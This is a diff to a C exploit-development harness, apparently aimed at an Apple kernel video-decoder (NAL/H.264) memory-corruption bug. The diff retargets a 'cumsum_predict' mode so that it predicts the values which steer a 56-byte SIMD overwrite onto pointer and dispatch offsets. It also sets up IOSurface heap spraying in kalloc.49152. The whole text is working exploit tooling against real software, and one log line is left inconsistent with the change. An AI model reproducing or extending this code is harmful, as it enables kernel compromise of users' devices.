@@ -582,8 +582,8 @@ int main(int argc, char *argv[]) {
         phase5_firmware(210, lid);
 
     } else if (strcmp(mode, "cumsum_predict") == 0) {
-        rlog("CUMSUM_PREDICT: Measure NAL sizes to predict cumsum at entry #601\n");
-        rlog("+0x5C88 (SIMD target pointer) is at entry 601, byte offset 8 = cumsum\n");
+        rlog("CUMSUM_PREDICT: Measure NAL sizes to predict cumsum at entry #593\n");
+        rlog("+0x5C88 (SIMD target pointer) is at entry 593, byte offset 8 = cumsum\n");
         rlog("The cumsum value at entry 601 becomes the SIMD overwrite's target addr\n");
         rlog("If we can predict/control cumsum, we can redirect the 56-byte write\n\n");
         if (phase1_verify() != 0) goto done;
@@ -612,14 +612,16 @@ int main(int argc, char *argv[]) {
         if (total_entries > 0) {
             double avg_nal = (double)total_nal_bytes / total_entries;
             double avg_cumsum_inc = avg_nal / 8.0;
-            double cumsum_at_601 = avg_cumsum_inc * 601;
+            double cumsum_at_593 = avg_cumsum_inc * 593;
             rlog("Average NAL size: %.1f bytes\n", avg_nal);
             rlog("Average cumsum increment (data>>3): %.2f per entry\n", avg_cumsum_inc);
-            rlog("PREDICTED cumsum at entry 601: %.0f (0x%x)\n",
-                 cumsum_at_601, (uint32_t)cumsum_at_601);
-            rlog("PREDICTED cumsum at entry 630: %.0f (0x%x)\n",
+            rlog("PREDICTED cumsum at entry 592 (+0x5C70 ptr low32): %.0f (0x%x)\n",
+                 avg_cumsum_inc * 592, (uint32_t)(avg_cumsum_inc * 592));
+            rlog("PREDICTED cumsum at entry 593 (+0x5C88 ptr low32): %.0f (0x%x)\n",
+                 cumsum_at_593, (uint32_t)cumsum_at_593);
+            rlog("PREDICTED cumsum at entry 630 (+0x5ED4 SIMD src): %.0f (0x%x)\n",
                  avg_cumsum_inc * 630, (uint32_t)(avg_cumsum_inc * 630));
-            rlog("PREDICTED cumsum at entry 642: %.0f (0x%x)\n",
+            rlog("PREDICTED cumsum at entry 642 (+0x5F94 dispatch): %.0f (0x%x)\n",
                  avg_cumsum_inc * 642, (uint32_t)(avg_cumsum_inc * 642));
             rlog("\nFor IOSurface spray targeting:\n");
             rlog("  kalloc.49152 addresses typically align to 0x1000 pages\n");
